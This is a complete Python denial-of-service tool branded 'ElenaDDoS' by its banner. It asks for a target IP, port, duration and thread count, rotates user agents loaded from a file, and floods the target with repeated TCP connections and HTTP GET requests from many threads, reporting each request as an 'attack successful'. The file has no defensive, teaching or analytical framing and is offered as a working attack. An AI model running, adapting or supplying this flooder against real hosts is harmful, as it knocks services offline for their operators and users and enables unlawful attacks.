import socket
import time
import random
import threading
from threading import Thread
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Function to get color codes
def get_color_code(color_name):
    color_codes = {
        'red': Fore.RED,
        'green': Fore.GREEN,
        'yellow': Fore.YELLOW,
        'blue': Fore.BLUE,
        'reset': Style.RESET_ALL
    }
    return color_codes.get(color_name.lower(), Fore.RESET)

# Display the banner
print(f"{Fore.BLUE} ···················································")
print(f"{Fore.BLUE}: _____ _                  ____  ____       ____  :")
print(f"{Fore.BLUE}:| ____| | ___ _ __   __ _|  _ \\|  _ \\  ___/ ___| :")
print(f"{Fore.BLUE}:|  _| | |/ _ \\ '_ \\ / _` | | | | | | |/ _ \\___ \\ :")
print(f"{Fore.BLUE}:| |___| |  __/ | | | (_| | |_| | |_| | (_) |__) |:")
print(f"{Fore.BLUE}:|_____|_|\\___|_| |_|\\__,_|____/|____/ \\___/____/ :")
print(f"{Fore.BLUE}···················································")
print()

# Get user inputs
ip = str(input(f"{Fore.GREEN}[>] IP: {Style.RESET_ALL}"))
port = int(input(f"{Fore.GREEN}[>] Port: {Style.RESET_ALL}"))
floodtime = int(input(f"{Fore.GREEN}[>] Time (seconds): {Style.RESET_ALL}"))
thread_count = int(input(f"{Fore.GREEN}[>] Threads: {Style.RESET_ALL}"))

# Load user agents from file
try:
    with open("user-agents.txt", "r") as f:
        user_agents = f.read().splitlines()
except FileNotFoundError:
    print(f"{Fore.RED}[!] Error: The 'user-agents.txt' file was not found.")
    exit()

def tcp(ip, port, floodtime, size):
    end_time = time.time() + floodtime
    while time.time() < end_time:
        user_agent = random.choice(user_agents)  # Select a random User-Agent
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, port))
                # Sending random data with User-Agent header
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
                sock.send(request.encode())
                print(f"{Fore.GREEN}[+] Attack successful with User-Agent: {user_agent}")  # Success message
            except socket.error as e:
                print(f"{Fore.BLUE}[!] Connection failed: {e}")  # Failure message with exception details

# Create and start threads
for _ in range(thread_count):
    print(f"{Fore.YELLOW}[*] Starting thread {_ + 1}")
    Thread(target=tcp, args=(ip, port, floodtime, 1024)).start()

print(f"{Fore.GREEN}[*] Attack started with {thread_count} threads targeting {ip}:{port} for {floodtime} seconds.")